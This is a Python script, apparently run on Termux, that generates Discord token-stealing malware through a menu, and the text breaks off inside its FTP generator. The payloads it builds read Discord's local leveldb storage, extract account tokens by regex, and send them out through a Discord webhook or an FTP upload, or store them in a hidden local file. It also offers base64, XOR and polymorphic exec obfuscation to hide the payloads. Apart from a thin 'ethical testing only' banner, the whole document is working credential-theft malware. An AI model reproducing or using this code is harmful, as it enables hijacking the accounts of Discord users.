#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import json
import re
import shutil
from typing import Dict, List, Optional
from pathlib import Path

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax
from rich.style import Style

console = Console()

class DiscordTokenStealer:
    def __init__(self):
        self.banners = [
            self._gerar_banner_discord(),
            self._gerar_banner_hacker(),
            self._gerar_banner_venom()
        ]
        
        self.tecnicas = {
            'webhook': {
                'nome': 'Webhook Discord',
                'descricao': 'Envia tokens via webhook para Discord',
                'perigo': 'alto',
                'func': self._gerar_webhook
            },
            'arquivo_local': {
                'nome': 'Arquivo Local',
                'descricao': 'Salva tokens em arquivo local',
                'perigo': 'medio', 
                'func': self._gerar_arquivo_local
            },
            'ftp_server': {
                'nome': 'Servidor FTP',
                'descricao': 'Envia tokens para servidor FTP',
                'perigo': 'alto',
                'func': self._gerar_ftp
            }
        }
        
        self.ofuscacoes = {
            'base64': 'Codifica√ß√£o Base64',
            'string_escape': 'Escape de Strings',
            'xor_encrypt': 'Criptografia XOR',
            'polimorfico': 'Ofusca√ß√£o Polim√≥rfica'
        }
    
    def _gerar_banner_discord(self) -> str:
        return """
[bold blue]
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ä‚£Ä‚£Ä‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ª‚£ø‚£ø‚£ø‚£ø‚†ü‚†õ‚†õ‚†ª‚£ø‚£ø‚£ø‚£ø‚°ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚¢ø‚£ø‚°ø‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚¢ø‚£ø‚°ø‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£∂‚£∂‚£∂‚£∂‚£¶‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∞‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†á‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚†ª‚†ø‚†ø‚†ø‚†ø‚†ü‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†â‚†â‚†â‚†â‚†â‚†â‚†â‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
[/bold blue]
[bold white on blue]        DISCORD TOKEN STEALER - NIGHTMARE EDITION[/bold white on blue]
"""
    
    def _gerar_banner_hacker(self) -> str:
        return """
[bold green]
‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ  ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà   ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñÑ   ‚ñà    ‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñÑ ‚ñÑ‚ñà‚ñà‚ñà‚ñì
‚ñí‚ñà‚ñà‚ñÄ ‚ñà‚ñà‚ñå‚ñí‚ñà‚ñà‚ñí  ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñÄ ‚ñÄ‚ñà   ‚ñà‚ñà  ‚ñì‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà‚ñí‚ñÄ‚ñà‚ñÄ ‚ñà‚ñà‚ñí
‚ñë‚ñà‚ñà   ‚ñà‚ñå‚ñí‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí‚ñí‚ñì‚ñà    ‚ñÑ ‚ñì‚ñà‚ñà  ‚ñí‚ñà‚ñà‚ñë‚ñì‚ñà‚ñà    ‚ñì‚ñà‚ñà‚ñë
‚ñë‚ñì‚ñà‚ñÑ   ‚ñå‚ñí‚ñà‚ñà   ‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ  ‚ñí‚ñì‚ñì‚ñÑ ‚ñÑ‚ñà‚ñà‚ñí‚ñì‚ñì‚ñà  ‚ñë‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà    ‚ñí‚ñà‚ñà 
‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñì ‚ñë ‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí‚ñí ‚ñì‚ñà‚ñà‚ñà‚ñÄ ‚ñë‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí   ‚ñë‚ñà‚ñà‚ñí
 ‚ñí‚ñí‚ñì  ‚ñí ‚ñë ‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë ‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë‚ñë ‚ñë‚ñí ‚ñí  ‚ñë‚ñë‚ñí‚ñì‚ñí ‚ñí ‚ñí ‚ñë ‚ñí‚ñë   ‚ñë  ‚ñë
 ‚ñë ‚ñí  ‚ñí   ‚ñë ‚ñí ‚ñí‚ñë   ‚ñë‚ñí ‚ñë ‚ñí‚ñë  ‚ñë  ‚ñí   ‚ñë‚ñë‚ñí‚ñë ‚ñë ‚ñë ‚ñë  ‚ñë      ‚ñë
 ‚ñë ‚ñë  ‚ñë ‚ñë ‚ñë ‚ñë ‚ñí    ‚ñë‚ñë   ‚ñë ‚ñë         ‚ñë‚ñë‚ñë ‚ñë ‚ñë ‚ñë      ‚ñë   
   ‚ñë        ‚ñë ‚ñë     ‚ñë     ‚ñë ‚ñë         ‚ñë            ‚ñë   
 ‚ñë                      ‚ñë                                
[/bold green]
[bold black on green]        TOKEN GRABBER MASTER - v2.5.1[/bold black on green]
"""
    
    def _gerar_banner_venom(self) -> str:
        return """
[bold red]
‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà    ‚ñà‚ñÑ   ‚ñÑ‚ñà        ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ   
‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà       ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñà‚ñà‚ñÑ 
‚ñà‚ñà‚ñà    ‚ñà‚ñÄ  ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà       ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà 
‚ñà‚ñà‚ñà        ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà       ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà 
‚ñà‚ñà‚ñà        ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà       ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà 
‚ñà‚ñà‚ñà    ‚ñà‚ñÑ  ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà       ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà 
‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñå    ‚ñÑ ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà 
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ‚ñÑ‚ñà‚ñà  ‚ñÄ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ   ‚ñÄ‚ñà   ‚ñà‚ñÄ  
                         ‚ñÄ                            
[/bold red]
[bold white on red]        VENOM TOKEN STEALER - DARK WEB EDITION[/bold white on red]
"""
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]‚ö†Ô∏è USO APENAS PARA TESTES √âTICOS! ‚ö†Ô∏è[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]üéØ GERADOR DE TOKEN STEALER[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Op√ß√£o", style="cyan", width=8)
            tabela.add_column("T√©cnica", style="green")
            tabela.add_column("Descri√ß√£o", style="white")
            tabela.add_column("Perigo", style="red")
            
            for i, (key, tech) in enumerate(self.tecnicas.items(), 1):
                icone_perigo = "üî•" if tech['perigo'] == 'alto' else "‚ö†Ô∏è" if tech['perigo'] == 'medio' else "üî∂"
                tabela.add_row(str(i), tech['nome'], tech['descricao'], f"{icone_perigo} {tech['perigo'].upper()}")
            
            tabela.add_row("4", "Todas as T√©cnicas", "Combo completo de roubo", "üíÄ CR√çTICO")
            tabela.add_row("0", "Sair", "Encerrar programa", "üö™")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]‚û§[/blink yellow] Selecione a t√©cnica",
                choices=[str(i) for i in range(0, 5)],
                show_choices=False
            )
            
            if escolha == "1":
                self._processar_tecnica('webhook')
            elif escolha == "2":
                self._processar_tecnica('arquivo_local')
            elif escolha == "3":
                self._processar_tecnica('ftp_server')
            elif escolha == "4":
                self._processar_todas_tecnicas()
            elif escolha == "0":
                self._sair()
    
    def _processar_tecnica(self, tecnica: str):
        console.clear()
        tech_info = self.tecnicas[tecnica]
        
        console.print(Panel.fit(
            f"[bold red]üéØ {tech_info['nome'].upper()} [/bold red]",
            border_style="red"
        ))
        console.print(f"[cyan]Descri√ß√£o:[/cyan] {tech_info['descricao']}")
        console.print(f"[cyan]N√≠vel de perigo:[/cyan] {tech_info['perigo'].upper()}")
        
        if tech_info['perigo'] in ['alto', 'critico']:
            console.print(Panel.fit(
                "[blink bold red]‚ö†Ô∏è ALTA PERIGOSIDADE ‚ö†Ô∏è[/blink bold red]\n"
                "Esta t√©cnica pode causar roubo de identidade\n"
                "Use apenas em ambientes controlados!",
                border_style="red"
            ))
            
            if not Confirm.ask("Confirmar cria√ß√£o?", default=False):
                return
        
        config = self._configurar_tecnica(tecnica)
        if not config:
            return
        
        ofuscar = Confirm.ask("Aplicar t√©cnicas de ofusca√ß√£o?")
        tecnicas_ofusca = []
        if ofuscar:
            tecnicas_ofusca = self._selecionar_ofuscacoes()
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando stealer...[/red]", total=100)
            
            payload = tech_info['func'](**config)
            progress.update(task, advance=30)
            
            if ofuscar:
                for tecnica_ofusca in tecnicas_ofusca:
                    payload = self._aplicar_ofuscacao(payload, tecnica_ofusca)
                    progress.update(task, advance=20)
            
            progress.update(task, completed=100)
        
        self._preview_payload(payload)
        self._salvar_payload(tecnica, payload)
    
    def _processar_todas_tecnicas(self):
        console.clear()
        console.print(Panel.fit(
            "[bold red]üíÄ COMBO COMPLETO DE ROUBO[/bold red]",
            border_style="red"
        ))
        
        console.print(Panel.fit(
            "[blink bold red]‚ò†Ô∏è PERIGO CR√çTICO - RISCOS EXTREMOS ‚ò†Ô∏è[/blink bold red]\n"
            "Esta op√ß√£o combina todas as t√©cnicas de roubo!\n"
            "Pode resultar em consequ√™ncias graves!",
            border_style="red"
        ))
        
        if not Confirm.ask("Confirmar cria√ß√£o do combo completo?", default=False):
            return
        
        configs = {}
        for tecnica in self.tecnicas.keys():
            config = self._configurar_tecnica(tecnica)
            if config:
                configs[tecnica] = config
        
        ofuscar = Confirm.ask("Aplicar t√©cnicas de ofusca√ß√£o?")
        tecnicas_ofusca = []
        if ofuscar:
            tecnicas_ofusca = self._selecionar_ofuscacoes()
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando combo completo...[/red]", total=100)
            
            payloads = []
            for tecnica, config in configs.items():
                payload = self.tecnicas[tecnica]['func'](**config)
                payloads.append(payload)
                progress.update(task, advance=20)
            
            # Combinar todos os payloads
            combo_payload = self._combinar_payloads(payloads)
            progress.update(task, advance=20)
            
            if ofuscar:
                for tecnica_ofusca in tecnicas_ofusca:
                    combo_payload = self._aplicar_ofuscacao(combo_payload, tecnica_ofusca)
                    progress.update(task, advance=10)
            
            progress.update(task, completed=100)
        
        self._preview_payload(combo_payload)
        self._salvar_payload('combo_completo', combo_payload)
    
    def _configurar_tecnica(self, tecnica: str) -> Optional[Dict]:
        config = {}
        
        if tecnica == 'webhook':
            console.print(Panel.fit(
                "[bold]Configura√ß√£o Webhook[/bold]",
                border_style="blue"
            ))
            config['webhook_url'] = Prompt.ask(
                "[yellow]?[/yellow] URL do Webhook Discord",
                default="https://discord.com/api/webhooks/your_webhook_here"
            )
            config['embed_color'] = IntPrompt.ask(
                "[yellow]?[/yellow] Cor do embed (decimal)",
                default=16711680  # Red
            )
            config['ping_user'] = Confirm.ask(
                "[yellow]?[/yellow] Pingar usu√°rio no webhook?",
                default=False
            )
        
        elif tecnica == 'ftp_server':
            console.print(Panel.fit(
                "[bold]Configura√ß√£o FTP[/bold]",
                border_style="blue"
            ))
            config['ftp_host'] = Prompt.ask(
                "[yellow]?[/yellow] Host FTP",
                default="ftp.example.com"
            )
            config['ftp_user'] = Prompt.ask(
                "[yellow]?[/yellow] Usu√°rio FTP",
                default="anonymous"
            )
            config['ftp_pass'] = Prompt.ask(
                "[yellow]?[/yellow] Senha FTP",
                default=""
            )
            config['ftp_path'] = Prompt.ask(
                "[yellow]?[/yellow] Caminho no FTP",
                default="/tokens/"
            )
        
        elif tecnica == 'arquivo_local':
            console.print(Panel.fit(
                "[bold]Configura√ß√£o Arquivo Local[/bold]",
                border_style="blue"
            ))
            config['file_path'] = Prompt.ask(
                "[yellow]?[/yellow] Caminho do arquivo",
                default=r"%APPDATA%\Discord\tokens.txt"
            )
            config['hidden_file'] = Confirm.ask(
                "[yellow]?[/yellow] Arquivo oculto?",
                default=True
            )
            config['append_mode'] = Confirm.ask(
                "[yellow]?[/yellow] Modo append (adicionar ao existente)?",
                default=True
            )
        
        console.print("\n[bold]Resumo da configura√ß√£o:[/bold]")
        for chave, valor in config.items():
            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
        
        if not Confirm.ask("Confirmar configura√ß√µes?"):
            return None
        
        return config
    
    def _selecionar_ofuscacoes(self) -> List[str]:
        console.print("\n[bold]T√©cnicas de ofusca√ß√£o dispon√≠veis:[/bold]")
        tabela = Table(show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan", width=5)
        tabela.add_column("T√©cnica", style="green")
        tabela.add_column("Dificuldade", style="yellow")
        
        dificuldades = {
            'base64': "F√°cil",
            'string_escape': "M√©dio", 
            'xor_encrypt': "Dif√≠cil",
            'polimorfico': "Extremo"
        }
        
        for i, (codigo, desc) in enumerate(self.ofuscacoes.items(), 1):
            tabela.add_row(str(i), desc, dificuldades.get(codigo, "Desconhecida"))
        
        console.print(tabela)
        
        escolhas = Prompt.ask(
            "[yellow]?[/yellow] Selecione as t√©cnicas (separadas por v√≠rgula)",
            default="1,2"
        )
        
        return [list(self.ofuscacoes.keys())[int(x)-1] for x in escolhas.split(',')]
    
    def _aplicar_ofuscacao(self, payload: str, tecnica: str) -> str:
        if tecnica == 'base64':
            return self._ofuscar_base64(payload)
        elif tecnica == 'string_escape':
            return self._ofuscar_string_escape(payload)
        elif tecnica == 'xor_encrypt':
            return self._ofuscar_xor(payload)
        elif tecnica == 'polimorfico':
            return self._ofuscar_polimorfico(payload)
        return payload
    
    def _ofuscar_base64(self, payload: str) -> str:
        encoded = base64.b64encode(payload.encode()).decode()
        return f"import base64; exec(base64.b64decode('{encoded}').decode())"
    
    def _ofuscar_string_escape(self, payload: str) -> str:
        escaped = payload.encode('unicode_escape').decode()
        return f"exec('{escaped}')"
    
    def _ofuscar_xor(self, payload: str) -> str:
        key = random.randint(1, 255)
        xor_encoded = ''.join(chr(ord(c) ^ key) for c in payload)
        xor_encoded_b64 = base64.b64encode(xor_encoded.encode()).decode()
        
        return f"""import base64
key = {key}
data = base64.b64decode('{xor_encoded_b64}').decode()
exec(''.join(chr(ord(c) ^ key) for c in data))"""
    
    def _ofuscar_polimorfico(self, payload: str) -> str:
        # Dividir o payload em partes
        parts = []
        chunk_size = len(payload) // 3
        for i in range(0, len(payload), chunk_size):
            part = payload[i:i+chunk_size]
            parts.append(base64.b64encode(part.encode()).decode())
        
        # Gerar vari√°veis aleat√≥rias
        var_names = [f"v{random.randint(1000,9999)}" for _ in range(4)]
        
        code = f"""# Vari√°veis de ofusca√ß√£o
{var_names[0]} = {random.randint(100,999)}
{var_names[1]} = "{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}"
{var_names[2]} = ["""
        
        for part in parts:
            code += f'"{part}", '
        code = code.rstrip(', ') + ']\n'
        
        code += f"""# Reconstru√ß√£o do c√≥digo
{var_names[3]} = ''.join([base64.b64decode(p).decode() for p in {var_names[2]}])
exec({var_names[3]})"""
        
        return f"import base64\n{code}"
    
    def _combinar_payloads(self, payloads: List[str]) -> str:
        combined = """# COMBINED DISCORD TOKEN STEALER
# Multiple exfiltration techniques

import os
import sys
import json
import base64
import requests
from pathlib import Path

"""
        
        # Adicionar cada payload com separadores
        for i, payload in enumerate(payloads, 1):
            combined += f"\n# Technique {i}\n"
            # Extrair apenas a parte funcional (remover imports duplicados)
            lines = payload.split('\n')
            func_lines = [line for line in lines if not line.startswith('import ') and not line.startswith('from ')]
            combined += '\n'.join(func_lines) + '\n'
        
        return combined
    
    def _preview_payload(self, payload: str):
        console.print(Panel.fit(
            "[bold]PR√â-VISUALIZA√á√ÉO DO PAYLOAD[/bold]",
            border_style="yellow"
        ))
        
        lines = payload.split('\n')[:20]
        preview = '\n'.join(lines)
        
        console.print(Syntax(preview, "python", theme="monokai"))
        
        if len(payload.split('\n')) > 20:
            console.print("[yellow]... (mostrando primeiras 20 linhas)[/yellow]")
        
        console.print(f"[cyan]Tamanho total:[/cyan] {len(payload)} caracteres, {len(payload.splitlines())} linhas")
    
    def _salvar_payload(self, nome_tecnica: str, payload: str):
        nome_arquivo = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo",
            default=f"discord_stealer_{nome_tecnica}.py"
        )
        
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            # Calcular hashes
            with open(nome_arquivo, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                sha256 = hashlib.sha256(f.read()).hexdigest()
            
            console.print(Panel.fit(
                f"[green]‚úì Salvo como [bold]{nome_arquivo}[/bold][/green]\n"
                f"[cyan]MD5:[/cyan] [bold]{md5}[/bold]\n"
                f"[cyan]SHA256:[/cyan] [bold]{sha256}[/bold]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]‚úó Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def _gerar_webhook(self, webhook_url: str, embed_color: int, ping_user: bool, **kwargs) -> str:
        return f"""import os
import json
import requests
import base64
from pathlib import Path

def get_discord_tokens():
    tokens = []
    discord_paths = [
        os.getenv('APPDATA') + '\\\\Discord\\\\Local Storage\\\\leveldb\\\\',
        os.getenv('LOCALAPPDATA') + '\\\\Discord\\\\Local Storage\\\\leveldb\\\\',
        os.getenv('APPDATA') + '\\\\DiscordCanary\\\\Local Storage\\\\leveldb\\\\',
        os.getenv('APPDATA') + '\\\\DiscordPTB\\\\Local Storage\\\\leveldb\\\\'
    ]
    
    for path in discord_paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith('.ldb') or file.endswith('.log'):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            # Buscar tokens Discord
                            found_tokens = re.findall(r'[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}', content)
                            found_tokens += re.findall(r'mfa\\.[\\w-]{{84}}', content)
                            tokens.extend(found_tokens)
                    except:
                        pass
    
    return list(set(tokens))  # Remover duplicatas

def send_to_webhook(webhook_url, tokens, embed_color=16711680, ping=False):
    if not tokens:
        return False
    
    embed = {{
        "title": "üéØ Discord Tokens Captured",
        "color": embed_color,
        "fields": [
            {{
                "name": "Total Tokens",
                "value": str(len(tokens)),
                "inline": True
            }},
            {{
                "name": "Machine",
                "value": os.getenv('COMPUTERNAME', 'Unknown'),
                "inline": True
            }}
        ],
        "timestamp": "2023-01-01T00:00:00.000Z"
    }}
    
    content = ""
    if ping:
        content = "@everyone"
    
    for i, token in enumerate(tokens[:25], 1):  # Limitar a 25 tokens
        embed["fields"].append({{
            "name": f"Token {{i}}",
            "value": f"```{{token}}```",
            "inline": False
        }})
    
    data = {{
        "content": content,
        "embeds": [embed]
    }}
    
    try:
        response = requests.post(webhook_url, json=data, timeout=10)
        return response.status_code == 204
    except:
        return False

# Execu√ß√£o principal
if __name__ == "__main__":
    tokens = get_discord_tokens()
    if tokens:
        send_to_webhook("{webhook_url}", tokens, {embed_color}, {str(ping_user).lower()})
"""
    
    def _gerar_arquivo_local(self, file_path: str, hidden_file: bool, append_mode: bool, **kwargs) -> str:
        return f"""import os
import re
import json
from pathlib import Path

def find_discord_tokens():
    tokens = []
    discord_paths = [
        os.getenv('APPDATA') + '\\\\Discord\\\\Local Storage\\\\leveldb\\\\',
        os.getenv('LOCALAPPDATA') + '\\\\Discord\\\\Local Storage\\\\leveldb\\\\',
        os.getenv('APPDATA') + '\\\\DiscordCanary\\\\Local Storage\\\\leveldb\\\\',
        os.getenv('APPDATA') + '\\\\DiscordPTB\\\\Local Storage\\\\leveldb\\\\'
    ]
    
    for path in discord_paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith('.ldb') or file.endswith('.log'):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            # Procurar tokens Discord
                            found_tokens = re.findall(r'[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}', content)
                            found_tokens += re.findall(r'mfa\\.[\\w-]{{84}}', content)
                            tokens.extend(found_tokens)
                    except:
                        continue
    
    return list(set(tokens))

def save_tokens_to_file(tokens, file_path, append=True, hidden=False):
    if not tokens:
        return False
    
    try:
        mode = 'a' if append else 'w'
        with open(file_path, mode, encoding='utf-8') as f:
            f.write("=" * 50 + "\\n")
            f.write(f"Discord Tokens - {{os.getenv('COMPUTERNAME', 'Unknown')}}\\n")
            f.write(f"Captured: 2023-01-01 00:00:00\\n")
            f.write("=" * 50 + "\\n\\n")
            
            for i, token in enumerate(tokens, 1):
                f.write(f"Token {{i}}: {{token}}\\n")
            
            f.write("\\n" + "=" * 50 + "\\n\\n")
        
        if hidden:
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)
        
        return True
    except:
        return False

# Execu√ß√£o principal
if __name__ == "__main__":
    tokens = find_discord_tokens()
    if tokens:
        save_tokens_to_file(
            tokens, 
            r"{file_path}", 
            append={str(append_mode).lower()}, 
            hidden={str(hidden_file).lower()}
        )
"""
    
    def _gerar_ftp(self, ftp_host: str, ftp_user: str, ftp_pass: str, ftp_path: str, **kwargs) -> str:
        return f"""import os
import re
import json
import base64
from ftplib import FTP
from datetime import datetime

def extract_discord_tokens():
    tokens = []
    discord_dirs = [
        os.getenv('APPDATA') + '\\\\Discord',
        os.getenv('APPDATA') + '\\\\DiscordCanary', 
        os.getenv('APPDATA') + '\\\\DiscordPTB',
        os.getenv('LOCALAPPDATA') + '\\\\Discord'
    ]
    
    for discord_dir in discord_dirs:
        if os.path.exists(discord_dir):
            leveldb_path = os.path.join(discord_dir, 'Local Storage', 'leveldb')
            if os.path.exists(leveldb_path):
                for file in os.listdir(leveldb_path):
                    if file.endswith(('.ldb', '.log')):
                        try:
                            with open(os.path.join(leveldb_path, file), 'r', errors='ignore') as f:
                                content = f.read()
                                # Regex para tokens Discord
                                token_patterns = [
                                    r'[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}',
                                    r'mfa\\.[\\w-]{{84}}'
                                ]
                                for pattern in token_patterns:
                                    found = re.findall(pattern, content)
                                    tokens.extend(found)
                        except:
                            continue
    
    return list(set(tokens))

def upload_to_ftp(tokens, host, username, password, remote_path):
    if not tokens:
        return False
    
    try:
        # Conectar ao FTP
        ftp = FTP(host)
        ftp.login(username, password)
        
        # Criar diret√≥rio se n√£o existir
        try:
            ftp.cwd(remote_path)
        except:
            ftp.mkd(remote_path)
            ftp.cwd(remote_path)
        
        # Nome do arquivo √∫nico
        computer_name = os.getenv('COMPUTERNAME', 'UNKNOWN')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"discord_tokens_{{computer_name}}_{{timestamp}}.txt"
        
        # Criar arquivo tempor√°rio
        temp_file = os.path.join(os.getenv('TEMP'), filename)
        with open(temp_file, 'w', encoding='utf-8') as f:
